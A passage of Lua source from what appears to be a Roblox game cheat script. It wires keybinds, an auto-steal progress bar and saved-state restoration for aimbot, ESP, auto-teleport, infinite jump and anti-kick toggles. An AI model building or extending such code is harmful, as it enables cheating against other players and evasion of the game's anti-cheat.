if input.UserInputType ~= Enum.UserInputType.Keyboard and not isControllerInput then return end
if input.KeyCode == Enum.KeyCode.Unknown then return end
if speedKeybinds.ToggleUI and input.KeyCode == speedKeybinds.ToggleUI then
if Main.Visible then
if _G.SoundCloseMainUI then _G.SoundCloseMainUI() else
Main.Visible = false
MiniFrame.Visible = true
_G.__SoundDuelsMinimized = true
end
else
if _G.SoundOpenMainUI then _G.SoundOpenMainUI() else
Main.Visible = true
MiniFrame.Visible = false
Main.Size = FULL_MAIN_SIZE
_G.__SoundDuelsMinimized = false
end
end
if saveSoundConfig then pcall(saveSoundConfig) end
return
end
if listeningForSpeedKey then
if tick() - (keybindListenStartedAt or 0) < 0.18 then return end
local targetKey = listeningForSpeedKey
if input.KeyCode == Enum.KeyCode.Escape then
listeningForSpeedKey = nil
refreshAllSpeedKeybinds()
return
end
if input.KeyCode == Enum.KeyCode.Backspace or input.KeyCode == Enum.KeyCode.Delete then
speedKeybinds[targetKey] = nil
else
for otherKeyId, boundKey in pairs(speedKeybinds) do
if otherKeyId ~= targetKey and boundKey == input.KeyCode then
speedKeybinds[otherKeyId] = nil
end
end
if tpDownKeybind == input.KeyCode then
tpDownKeybind = nil
refreshTPDownKeybind()
end
speedKeybinds[targetKey] = input.KeyCode
end
listeningForSpeedKey = nil
refreshAllSpeedKeybinds()
if saveSoundConfig then pcall(saveSoundConfig) end
return
end
if listeningForTPDownKey then
if tick() - (keybindListenStartedAt or 0) < 0.18 then return end
if input.KeyCode == Enum.KeyCode.Escape then
listeningForTPDownKey = false
refreshTPDownKeybind()
return
end
if input.KeyCode == Enum.KeyCode.Backspace or input.KeyCode == Enum.KeyCode.Delete then
tpDownKeybind = nil
else
for keyId, boundKey in pairs(speedKeybinds) do
if boundKey == input.KeyCode then
speedKeybinds[keyId] = nil
end
end
tpDownKeybind = input.KeyCode
end
listeningForTPDownKey = false
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
if saveSoundConfig then pcall(saveSoundConfig) end
return
end
if speedKeybinds.SpeedToggle and input.KeyCode == speedKeybinds.SpeedToggle then
toggleCarryMode()
return
end
if speedKeybinds.LaggerToggle and input.KeyCode == speedKeybinds.LaggerToggle then
toggleLaggerMode()
return
end
if speedKeybinds.Aimbot and input.KeyCode == speedKeybinds.Aimbot then
if _G.SoundSafeModeIsLocked and _G.SoundSafeModeIsLocked() then
if _G.SoundSafeModeForceStop then _G.SoundSafeModeForceStop("SAFE MODE LOCK") end
return
end
if _G.SoundToggleSelectedAimbot then
_G.SoundToggleSelectedAimbot()
elseif selectedAimbotMode == "Anti Bypass" and _G.SoundStartAntiBypassAimbot and _G.SoundStopAntiBypassAimbot then
if _G.SoundAntiBypassAimbotOn then _G.SoundStopAntiBypassAimbot() else _G.SoundStartAntiBypassAimbot() end
elseif _G.SoundStartNormalAimbot and _G.SoundStopNormalAimbot then
if _G.SoundNormalAimbotOn then _G.SoundStopNormalAimbot() else _G.SoundStartNormalAimbot() end
end
if _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end
return
end
if speedKeybinds.DropBrainrot and input.KeyCode == speedKeybinds.DropBrainrot then
runDropBrainrot()
return
end
if speedKeybinds.AutoLeft and input.KeyCode == speedKeybinds.AutoLeft then
if _G.SoundSetAutoLeft then _G.SoundSetAutoLeft(not autoLeftEnabled) end
return
end
if speedKeybinds.AutoRight and input.KeyCode == speedKeybinds.AutoRight then
if _G.SoundSetAutoRight then _G.SoundSetAutoRight(not autoRightEnabled) end
return
end
if speedKeybinds.InstaReset and input.KeyCode == speedKeybinds.InstaReset then
if _G.SoundInstaResetRun then _G.SoundInstaResetRun() end
return
end
if speedKeybinds.BatV2 and input.KeyCode == speedKeybinds.BatV2 then
if _G.SoundToggleBatV2 then _G.SoundToggleBatV2() end
return
end
if tpDownKeybind and input.KeyCode == tpDownKeybind then
runTPFloor()
return
end
end)
task.defer(function()
task.wait(0.15)
pcall(function()
for _, pageName in ipairs({"MOVEMENT","COMBAT"}) do
local page = pages[pageName]
if page then
for _, holder in ipairs(page:GetDescendants()) do
if holder:IsA("Frame") and holder:FindFirstChild("SelectedSlide") then
holder.Size = UDim2.new(1,-4,0,34)
holder.BackgroundColor3 = Color3.fromRGB(0,0,0)
holder.BackgroundTransparency = 0.3

local slide = holder:FindFirstChild("SelectedSlide")
if slide then
slide.Size = UDim2.new(0.5,-4,1,-8)
slide.BackgroundColor3 = Color3.fromRGB(255,255,255)
slide.BackgroundTransparency = 0.85
local s = slide:FindFirstChildOfClass("UIStroke")
if s then
s.Color = Color3.fromRGB(255,255,255)
s.Thickness = 1
s.Transparency = 0.2
end
end

for _, child in ipairs(holder:GetChildren()) do
if child:IsA("TextLabel") or child:IsA("TextButton") then
child.Font = Enum.Font.GothamMedium
child.TextSize = 12
end
end
end
end

for _, obj in ipairs(page:GetDescendants()) do
if obj:IsA("TextButton") and obj.Name == "ArrowButton" then
obj.Position = UDim2.new(1,-108,0.5,-13)
obj.Size = UDim2.new(0,38,0,26)
obj.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
obj.BackgroundTransparency = 0.18
obj.Text = "v"
obj.TextColor3 = Color3.fromRGB(255,255,255)
obj.TextSize = 22
obj.Font = Enum.Font.GothamBlack
local c = obj:FindFirstChildOfClass("UICorner")
if c then c.CornerRadius = UDim.new(0,7) end
end
end
end
end
end)
end)

setTab("MOVEMENT")
task.delay(0.5, function()
    setTab("MOVEMENT")
end)
_G.__SoundDuelsSetupStealBar = function()
local RunService = game:GetService("RunService")
local UIS = UserInputService
local TS = TweenService
local Stats = game:GetService("Stats")
local existingStealBar = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("StealBarGui")
if existingStealBar then existingStealBar:Destroy() end
local gui = Instance.new("ScreenGui")
gui.Name = "StealBarGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
safeParentGui(gui)

local function drag(frame)
    local dragging, dragStart, startPos = false, nil, nil
    frame.InputBegan:Connect(function(input)
        if _G.SoundGuiLocked == true then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    _G.SoundStealBarPosition = udim2ToTable(frame.Position)
                    if saveSoundConfig then pcall(saveSoundConfig) end
                end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- Warna tema bar (hitam + biru, sesuai video)
local BAR_BG = Color3.fromRGB(255, 255, 255)
local BAR_BORDER = Color3.fromRGB(214, 217, 226)
local BAR_BLUE_TEXT = Color3.fromRGB(255, 255, 255)
local TRACK_BG = Color3.fromRGB(38, 38, 42)

-- Main card (kotak hitam rounded: avatar | garis | persen | FPS/PING/jam | bar biru di bawah)
local pbFrame = Instance.new("Frame", gui)
pbFrame.Name = "StealBar"
pbFrame.Size = UDim2.new(0, 340, 0, 58)
local defaultStealPos = UDim2.new(0.5, -170, 1, -120)
pbFrame.Position = tableToUDim2(_G.SoundStealBarPosition, defaultStealPos)
pbFrame.BackgroundColor3 = BAR_BG
pbFrame.BackgroundTransparency = 1
pbFrame.BorderSizePixel = 0
pbFrame.Active = true
pbFrame.ClipsDescendants = true
Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 12)

-- Background image for Auto Steal progress UI
local stealBarBgImage = Instance.new("ImageLabel")
stealBarBgImage.Name = "StealBarBackgroundImage"
stealBarBgImage.Size = UDim2.new(1, 0, 1, 0)
stealBarBgImage.Position = UDim2.new(0, 0, 0, 0)
stealBarBgImage.BackgroundTransparency = 1
stealBarBgImage.Image = "rbxassetid://103865120520103"
stealBarBgImage.ImageTransparency = 0
stealBarBgImage.ScaleType = Enum.ScaleType.Crop
stealBarBgImage.ZIndex = 1
stealBarBgImage.Parent = pbFrame
Instance.new("UICorner", stealBarBgImage).CornerRadius = UDim.new(0, 12)

-- Gradient latar kartu (lebih terang: biru gelap -> biru terang -> ungu kebiruan)
local pbBgGrad = Instance.new("UIGradient", pbFrame)
pbBgGrad.Name = "BgGradient"
pbBgGrad.Rotation = 90
pbBgGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(224, 190, 255)),
    ColorSequenceKeypoint.new(0.22, Color3.fromRGB(145, 65, 220)),
    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(198, 135, 255)),
    ColorSequenceKeypoint.new(0.70, Color3.fromRGB(82, 30, 140)),
    ColorSequenceKeypoint.new(0.88, Color3.fromRGB(178, 105, 245)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(112, 45, 185)),
})
-- Efek gradient bergerak (naik-turun pelan) ala button
pcall(function()
    pbBgGrad.Offset = Vector2.new(0, -0.5)
    game:GetService("TweenService"):Create(pbBgGrad, TweenInfo.new(1.0, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Offset = Vector2.new(0, 0.5)}):Play()
end)

local pbSt = Instance.new("UIStroke", pbFrame)
pbSt.Color = BAR_BORDER
pbSt.Thickness = 2.4
pbSt.Transparency = 0
pbSt.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

pcall(function() addWhiteShimmer(pbFrame, 12, 2, 1.3, 0.3, Color3.fromRGB(190, 115, 255)) end)
drag(pbFrame)

local pbScale = Instance.new("UIScale")
pbScale.Name = "SoundProgressBarScale"
pbScale.Scale = tonumber(_G.SoundProgressBarScaleValue) or tonumber(aceProgressBarScaleValue) or 1
pbScale.Parent = pbFrame

-- Avatar (headshot pemain, bulat) di kiri
local avatar = Instance.new("ImageLabel", pbFrame)
avatar.Name = "Avatar"
avatar.Size = UDim2.new(0, 34, 0, 34)
avatar.Position = UDim2.new(0, 12, 0.5, -17)
avatar.BackgroundColor3 = Color3.fromRGB(60, 72, 130)
avatar.BorderSizePixel = 0
avatar.ZIndex = 3
avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LP.UserId) .. "&w=150&h=150"
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

-- Garis pemisah vertikal
local divider = Instance.new("Frame", pbFrame)
divider.Name = "Divider"
divider.Size = UDim2.new(0, 1, 0, 34)
divider.Position = UDim2.new(0, 56, 0.5, -17)
divider.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
divider.BackgroundTransparency = 0.35
divider.BorderSizePixel = 0
divider.ZIndex = 3

-- Persen besar (putih)
local pctLbl = Instance.new("TextLabel", pbFrame)
pctLbl.Name = "Percent"
pctLbl.BackgroundTransparency = 1
pctLbl.Size = UDim2.new(0, 70, 0, 26)
pctLbl.Position = UDim2.new(0, 66, 0, 6)
pctLbl.Font = Enum.Font.GothamBlack
pctLbl.TextSize = 19
pctLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
pctLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
pctLbl.TextStrokeTransparency = 0
pctLbl.TextXAlignment = Enum.TextXAlignment.Left
pctLbl.ZIndex = 4
pctLbl.Text = "0%"

-- FPS | PING | jam (biru, kanan atas)
local statsLbl = Instance.new("TextLabel", pbFrame)
statsLbl.Name = "Stats"
statsLbl.BackgroundTransparency = 1
statsLbl.AnchorPoint = Vector2.new(1, 0)
statsLbl.Size = UDim2.new(0, 210, 0, 16)
statsLbl.Position = UDim2.new(1, -14, 0, 10)
statsLbl.Font = Enum.Font.GothamBlack
statsLbl.TextSize = 11
statsLbl.TextColor3 = BAR_BLUE_TEXT
statsLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
statsLbl.TextStrokeTransparency = 0
statsLbl.TextXAlignment = Enum.TextXAlignment.Right
statsLbl.ZIndex = 4
statsLbl.Text = "FPS --   PING --ms | --:--"

-- Track gelap (bawah) + fill biru gradient
local pbg = Instance.new("Frame", pbFrame)
pbg.Name = "Track"
pbg.Size = UDim2.new(1, -132, 0, 8)
pbg.Position = UDim2.new(0, 118, 1, -20)
pbg.BackgroundColor3 = TRACK_BG
pbg.BorderSizePixel = 0
pbg.ClipsDescendants = true
pbg.ZIndex = 4
Instance.new("UICorner", pbg).CornerRadius = UDim.new(1, 0)

local progressFill = Instance.new("Frame", pbg)
progressFill.Name = "Fill"
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progressFill.BorderSizePixel = 0
progressFill.ZIndex = 5
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
local fillGrad = Instance.new("UIGradient", progressFill)
fillGrad.Rotation = 0
fillGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(150, 153, 164)),
    ColorSequenceKeypoint.new(0.35, Color3.fromRGB(235, 237, 244)),
    ColorSequenceKeypoint.new(0.65, Color3.fromRGB(165, 168, 179)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(225, 227, 235)),
})
-- Efek gradient bergerak (shimmer) pada fill
pcall(function()
    fillGrad.Offset = Vector2.new(-0.25, 0)
    TS:Create(fillGrad, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Offset = Vector2.new(0.25, 0)}):Play()
end)

function _G.SoundApplyStealUIImage() end

local barState = "IDLE"
local function setBarState(state)
    barState = state
    if state == "STEALING" then
        TS:Create(pbSt, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 255, 255), Transparency = 0, Thickness = 3.2}):Play()
    elseif state == "READY" then
        TS:Create(pbSt, TweenInfo.new(0.2), {Color = BAR_BORDER, Transparency = 0, Thickness = 2.4}):Play()
    else
        TS:Create(pbSt, TweenInfo.new(0.2), {Color = BAR_BORDER, Transparency = 0.25, Thickness = 2.4}):Play()
    end
end

-- Live FPS / PING / jam
task.spawn(function()
    local lastFrame = tick()
    local fpsSamples = {}
    local fpsAvg = 60
    RunService.RenderStepped:Connect(function()
        local now = tick()
        local dt = now - lastFrame
        lastFrame = now
        if dt > 0 then
            table.insert(fpsSamples, 1 / dt)
            if #fpsSamples > 30 then table.remove(fpsSamples, 1) end
            local sum = 0
            for _, v in ipairs(fpsSamples) do sum = sum + v end
            fpsAvg = sum / math.max(1, #fpsSamples)
        end
    end)
    while pbFrame and pbFrame.Parent do
        local ping = 0
        pcall(function()
            local stat = Stats.Network.ServerStatsItem["Data Ping"]
            if stat then ping = tonumber(stat:GetValue()) or 0 end
        end)
        local clock = tostring(os.date("%I:%M %p")):gsub("^0", "")
        statsLbl.Text = string.format("FPS %d   PING %dms | %s", math.floor(fpsAvg + 0.5), math.floor(ping + 0.5), clock)
        task.wait(0.35)
    end
end)

local StealBar = {}
function StealBar.SetProgress(p)
    p = math.clamp(p, 0, 1)
    progressFill.Size = UDim2.new(p, 0, 1, 0)
    pctLbl.Text = string.format("%d%%", math.floor(p * 100 + 0.5))
end
function StealBar.Reset()
    StealBar.SetProgress(0)
    setBarState("IDLE")
end
function StealBar.SetState(state)
    setBarState(state)
end
setBarState("IDLE")
_G.StealBar = StealBar
end
_G.__SoundDuelsSetupStealBar()
pcall(function()
    if applySoundProgressBarScale then applySoundProgressBarScale() end
    if _G.SoundApplyProgressBarScale then _G.SoundApplyProgressBarScale() end
end)
if _G.SoundAutoStealSync then task.defer(_G.SoundAutoStealSync) end
_G.__SoundDuelsSetupMinimizeToggle = function()
_G.__SoundDuelsMinimized = false
Close.MouseButton1Click:Connect(function()
if _G.SoundCloseMainUI then
_G.SoundCloseMainUI()
else
_G.__SoundDuelsMinimized = true
Main.Visible = false
MiniFrame.Visible = true
end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
_G.__SoundDuelsSetupMinimizeToggle()


_G.__SoundDuelsRunIntro = function()
    local origSize = FULL_MAIN_SIZE or Main.Size
    local wasMinimizedBeforeIntro = (_G.__SoundDuelsMinimized == true)
    pcall(stopIntroPlayback)
    pcall(stopIntroPreview)
    Main.Size = origSize
    Main.Visible = not wasMinimizedBeforeIntro
    MiniFrame.Visible = wasMinimizedBeforeIntro
end

_G.__SoundDuelsRunIntro()

_G.SoundDuelsForceSyncLoadedButtons = function()
pcall(function()
if setAutoTPVisual then setAutoTPVisual(autoTPEnabled) end
if autoTPEnabled then startAutoTP() else stopAutoTP() end
end)
pcall(function()
if setInfJumpVisual then setInfJumpVisual(infJumpEnabled) end
if setInfJumpInternal then setInfJumpInternal(infJumpEnabled) end
end)
pcall(function()
if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled) end
setAntiRagdoll(antiRagdollEnabled)
end)
pcall(function()
if _G.SoundSetAutoLeft then _G.SoundSetAutoLeft(autoLeftEnabled, true) end
if _G.SoundSetAutoRight then _G.SoundSetAutoRight(autoRightEnabled, true) end
end)
pcall(function()
if setAutoStealVisual then setAutoStealVisual(autoStealEnabled) end
if _G.SoundAutoStealSync then _G.SoundAutoStealSync() end
end)
pcall(function()
if _G.SoundNormalAutoSwingSetVisual then _G.SoundNormalAutoSwingSetVisual(autoSwingEnabled) end
if _G.SoundMirrorTPDownSetVisual then _G.SoundMirrorTPDownSetVisual(mirrorTPDownEnabled) end
if _G.SoundStopAntiDesyncAimbot then
pcall(_G.SoundStopAntiDesyncAimbot)
end
_G.SoundAntiDesyncAimbotOn = false
end)
pcall(function()
if selectedAimbotMode == "Anti Bypass" then
if _G.SoundNormalAimbotStop then _G.SoundNormalAimbotStop() end
if _G.SoundAntiBypassAimbotOn and _G.SoundAntiBypassStart then
_G.SoundAntiBypassStart()
elseif _G.SoundAntiBypassStop then
_G.SoundAntiBypassStop()
end
else
if _G.SoundAntiBypassStop then _G.SoundAntiBypassStop() end
if _G.SoundNormalAimbotOn and _G.SoundNormalAimbotStart then
_G.SoundNormalAimbotStart()
elseif _G.SoundNormalAimbotStop then
_G.SoundNormalAimbotStop()
end
end
if _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end
end)
pcall(function()
if setBatCounterVisual then setBatCounterVisual(batCounterEnabled) end
if setMedCounterVisual then setMedCounterVisual(medCounterEnabled) end
if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
if batCounterEnabled then
if _G.SoundStartBatCounter then _G.SoundStartBatCounter() end
else
if _G.SoundStopBatCounter then _G.SoundStopBatCounter() end
end
if medCounterEnabled then
if _G.SoundStartMedCounter then _G.SoundStartMedCounter(LP.Character) end
else
if _G.SoundStopMedCounter then _G.SoundStopMedCounter() end
end
if _G.SoundSetNoPlayerCollisionVisual then _G.SoundSetNoPlayerCollisionVisual(_G.SoundNoPlayerCollisionEnabled) end
if _G.SoundNoPlayerCollisionEnabled then
if enableNoPlayerCollision then enableNoPlayerCollision() end
else
if disableNoPlayerCollision then disableNoPlayerCollision() end
end
if _G.SoundSetAutoResetOnMed then
_G.SoundSetAutoResetOnMed(autoResetOnMedEnabled, true)
else
if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled) end
end
end)
pcall(function()
if setPlayerESPVisual then setPlayerESPVisual(espEnabled) end
if espEnabled then if startPlayerESP then startPlayerESP() end; if BoxedESPOptions then BoxedESPOptions.box = false end else if stopPlayerESP then stopPlayerESP() end; if BoxedESPOptions then BoxedESPOptions.box = false end end
if setESPLineVisual then setESPLineVisual(espLineEnabled == true) end
if espLineEnabled then if startESPLine then startESPLine() end else if stopESPLine then stopESPLine() end end
if setTracerESPVisual then setTracerESPVisual(showTracerEnabled) end
if BoxedESPOptions then BoxedESPOptions.tracer = false end
if refreshBoxedESP then refreshBoxedESP() end
if setRagdollCountdownVisual then setRagdollCountdownVisual(ragdollCountdownEnabled) end
if ragdollCountdownEnabled then hookRagdollCountdown(LP.Character) else stopRagdollCountdown() end
if setFPSBoostVisual then setFPSBoostVisual(fpsBoostEnabled) end
if fpsBoostEnabled then enableStretchRez() else disableStretchRez() end
if setAntiLagVisual then setAntiLagVisual(antiLagVisualEnabled) end
if antiLagVisualEnabled then enableAntiLag() else disableAntiLag() end
if setNukeOptimiserVisual then setNukeOptimiserVisual(nukeOptimiserEnabled) end
if nukeOptimiserEnabled then enableNukeOptimizer() else disableNukeOptimizer() end
if setFOVVisual then setFOVVisual(fovEnabled) end
if fovEnabled then enableCustomFov() else disableCustomFov() end
if setNoCamCollisionVisual then setNoCamCollisionVisual(noCamCollisionEnabled) end
if noCamCollisionEnabled then enableNoCamCollision() else disableNoCamCollision() end
if type(applyCustomSky) == "function" then
applyCustomSky((skyTheme and skyTheme ~= "") and skyTheme or "Off")
end
if skyValueLabel then skyValueLabel.Text = skyTheme or "Off" end
end)
if saveSoundConfig then pcall(saveSoundConfig) end
end
task.defer(function()
task.wait(0.35)
if type(applyCustomSky) == "function" then
pcall(function() applyCustomSky((skyTheme and skyTheme ~= "") and skyTheme or "Off") end)
end
if skyValueLabel then skyValueLabel.Text = skyTheme or "Off" end
end)
task.defer(_G.SoundDuelsForceSyncLoadedButtons)
task.delay(1, function()
if _G.SoundDuelsForceSyncLoadedButtons then _G.SoundDuelsForceSyncLoadedButtons() end
end)
task.defer(function()
task.wait(0.2)
if _G.SoundSyncToggleVisuals then _G.SoundSyncToggleVisuals() end
end)
customFontVisualEnabled = false
if V then V.customFontEnabled = false end
function enableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
function disableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
_G.SoundDuelsApplySavedGameplayStates = function()
pcall(function()
if setAutoTPVisual then setAutoTPVisual(autoTPEnabled == true) end
if autoTPEnabled then startAutoTP() else stopAutoTP() end
end)
pcall(function()
if setInfJumpVisual then setInfJumpVisual(infJumpEnabled == true) end
if setInfJumpInternal then setInfJumpInternal(infJumpEnabled == true) end
end)
pcall(function()
if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled == true) end
if setAntiRagdoll then setAntiRagdoll(antiRagdollEnabled == true) end
end)
pcall(function()
if _G.SoundAntiVoidVisual then _G.SoundAntiVoidVisual(_G.SoundAntiVoidEnabled == true) end
_G.SoundAntiVoidSet(_G.SoundAntiVoidEnabled == true)
end)
pcall(function()
if _G.SoundAntiResetVisual then _G.SoundAntiResetVisual(_G.SoundAntiResetEnabled == true) end
_G.SoundSetAntiReset(_G.SoundAntiResetEnabled == true)
end)
pcall(function()
if setAutoStealVisual then setAutoStealVisual(autoStealEnabled == true) end
if _G.SoundAutoStealSync then _G.SoundAutoStealSync() end
end)
pcall(function()
if setBatCounterVisual then setBatCounterVisual(batCounterEnabled == true) end
if batCounterEnabled and _G.SoundStartBatCounter then _G.SoundStartBatCounter() elseif _G.SoundStopBatCounter then _G.SoundStopBatCounter() end
end)
pcall(function()
if setMedCounterVisual then setMedCounterVisual(medCounterEnabled == true) end
if medCounterEnabled and _G.SoundStartMedCounter then _G.SoundStartMedCounter(LP.Character) elseif _G.SoundStopMedCounter then _G.SoundStopMedCounter() end
end)
pcall(function()
if setHardHitVisual then setHardHitVisual(hardHitEnabled == true) end
if hardHitEnabled and _G.SoundStartHardHit then _G.SoundStartHardHit() elseif _G.SoundStopHardHit then _G.SoundStopHardHit() end
end)
pcall(function()
if setPerfectHitVisual then setPerfectHitVisual(perfectHitEnabled == true) end
if perfectHitEnabled and _G.SoundStartPerfectHit then _G.SoundStartPerfectHit() elseif _G.SoundStopPerfectHit then _G.SoundStopPerfectHit() end
end)
pcall(function()
if _G.SoundSetNoPlayerCollisionVisual then _G.SoundSetNoPlayerCollisionVisual(_G.SoundNoPlayerCollisionEnabled == true) end
if _G.SoundNoPlayerCollisionEnabled then enableNoPlayerCollision() else disableNoPlayerCollision() end
end)
pcall(function()
if setSafeModeVisual then setSafeModeVisual(antiKickEnabled == true) end
end)
pcall(function()
if _G.SoundSetAutoResetOnMed then _G.SoundSetAutoResetOnMed(autoResetOnMedEnabled == true, true) end
end)
pcall(function()
if setPlayerESPVisual then setPlayerESPVisual(espEnabled == true) end
if espEnabled then if startPlayerESP then startPlayerESP() end else if stopPlayerESP then stopPlayerESP() end end
end)
pcall(function()
if setESPLineVisual then setESPLineVisual(espLineEnabled == true) end
if espLineEnabled then if startESPLine then startESPLine() end else if stopESPLine then stopESPLine() end end
end)
pcall(function()
if setTracerESPVisual then setTracerESPVisual(showTracerEnabled == true) end
if BoxedESPOptions then BoxedESPOptions.tracer = showTracerEnabled == true end
if refreshBoxedESP then refreshBoxedESP() end
end)
pcall(function()
if setRagdollCountdownVisual then setRagdollCountdownVisual(ragdollCountdownEnabled == true) end
if ragdollCountdownEnabled then hookRagdollCountdown(LP.Character) else stopRagdollCountdown() end
end)
pcall(function()
if setFPSBoostVisual then setFPSBoostVisual(fpsBoostEnabled == true) end
if fpsBoostEnabled then enableStretchRez() else disableStretchRez() end
end)
pcall(function()
if setAntiLagVisual then setAntiLagVisual(antiLagVisualEnabled == true) end
if antiLagVisualEnabled then enableAntiLag() else disableAntiLag() end
end)
pcall(function()
if setNukeOptimiserVisual then setNukeOptimiserVisual(nukeOptimiserEnabled == true) end
if nukeOptimiserEnabled then enableNukeOptimizer() else disableNukeOptimizer() end
end)
pcall(function()
if setFOVVisual then setFOVVisual(fovEnabled == true) end
if fovEnabled then enableCustomFov() else disableCustomFov() end
end)
pcall(function()
if setNoCamCollisionVisual then setNoCamCollisionVisual(noCamCollisionEnabled == true) end
if noCamCollisionEnabled then enableNoCamCollision() else disableNoCamCollision() end
end)
pcall(function()
if type(applyCustomSky) == "function" then applyCustomSky((skyTheme and skyTheme ~= "") and skyTheme or "Off") end
if skyValueLabel then skyValueLabel.Text = skyTheme or "Off" end
end)
pcall(function()
if syncAnimationPackIndex then syncAnimationPackIndex() end
if refreshAnimationPackRow then refreshAnimationPackRow() end
if applySavedAnimationPackToCharacter then applySavedAnimationPackToCharacter(LP.Character) end
end)
end
task.defer(function()
task.wait(0.25)
if _G.SoundDuelsApplySavedGameplayStates then _G.SoundDuelsApplySavedGameplayStates() end
end)
task.delay(1.25, function()
if _G.SoundDuelsApplySavedGameplayStates then _G.SoundDuelsApplySavedGameplayStates() end
end)
task.delay(3, function()
if antiLagVisualEnabled and type(applyKTMOptimization) == "function" then pcall(applyKTMOptimization) end
if nukeOptimiserEnabled and type(applyKTMOptimization) == "function" then pcall(applyKTMOptimization) end
end)
_G.SoundAutoTPRestoreWanted = _G.SoundAutoTPRestoreWanted or false
_G.SoundAutoTPRestoreBlockedUntil = _G.SoundAutoTPRestoreBlockedUntil or 0
function aceAnyAimbotActive()
return (_G.SoundNormalAimbotOn == true) or (_G.SoundAntiBypassAimbotOn == true) or (_G.SoundAntiDesyncAimbotOn == true) or (_G.SoundAntiDesyncAimbotOn == true)
end
_G.SoundStopAutoTPForAction = function()
if autoTPEnabled then
_G.SoundAutoTPRestoreWanted = true
_G.SoundAutoTPRestoreBlockedUntil = tick() + 0.35
stopAutoTP()
if setAutoTPVisual then setAutoTPVisual(false) end
end
end
function aceTryRestoreAutoTP()
if not _G.SoundAutoTPRestoreWanted then return end
if tick() < (_G.SoundAutoTPRestoreBlockedUntil or 0) then return end
if aceAnyAimbotActive() then return end
if dropBrainrotActive then return end
_G.SoundAutoTPRestoreWanted = false
startAutoTP()
if setAutoTPVisual then setAutoTPVisual(true) end
if saveSoundConfig then pcall(saveSoundConfig) end
end
RunService.Heartbeat:Connect(aceTryRestoreAutoTP)
_G._oldSoundStopNormalAimbot = _G.SoundStopNormalAimbot
_G.SoundStopNormalAimbot = function(...)
local r = {_G._oldSoundStopNormalAimbot(...)}
_G.SoundAutoTPRestoreBlockedUntil = tick() + 0.05
task.delay(0.08, aceTryRestoreAutoTP)
return unpack(r)
end
_G.SoundNormalAimbotStop = _G.SoundStopNormalAimbot
_G._oldSoundStopAntiBypassAimbot = _G.SoundStopAntiBypassAimbot
_G.SoundStopAntiBypassAimbot = function(...)
local r = {_G._oldSoundStopAntiBypassAimbot(...)}
_G.SoundAutoTPRestoreBlockedUntil = tick() + 0.05
task.delay(0.08, aceTryRestoreAutoTP)
return unpack(r)
end
_G.SoundAntiBypassStop = _G.SoundStopAntiBypassAimbot
_G._oldSoundStopAntiDesyncAimbot = _G.SoundStopAntiDesyncAimbot
_G.SoundStopAntiDesyncAimbot = function(...)
local r = {_G._oldSoundStopAntiDesyncAimbot(...)}
_G.SoundAutoTPRestoreBlockedUntil = tick() + 0.05
task.delay(0.08, aceTryRestoreAutoTP)
return unpack(r)
end
task.spawn(function()
local wasDropping = false
while task.wait(0.05) do
if dropBrainrotActive then
wasDropping = true
elseif wasDropping then
wasDropping = false
_G.SoundAutoTPRestoreBlockedUntil = tick() + 0.05
task.delay(0.08, aceTryRestoreAutoTP)
end
end
end)
function aceRepairKeybinds()
for keyId, defaultKey in pairs(DEFAULT_SPEED_KEYBINDS) do
if speedKeybinds[keyId] == nil or speedKeybinds[keyId] == Enum.KeyCode.Unknown then
speedKeybinds[keyId] = defaultKey
end
end
if tpDownKeybind == Enum.KeyCode.Unknown then tpDownKeybind = DEFAULT_TP_DOWN_KEYBIND end
if refreshAllSpeedKeybinds then refreshAllSpeedKeybinds() end
if refreshTPDownKeybind then refreshTPDownKeybind() end
end
_G._oldSaveSoundConfigStable = saveSoundConfig
saveSoundConfig = function()
aceRepairKeybinds()
return _G._oldSaveSoundConfigStable()
end
aceRepairKeybinds()
task.defer(function()
task.wait(0.2)
aceRepairKeybinds()
do end
end)
task.defer(function()
task.wait(0.35)
local TS = game:GetService("TweenService")
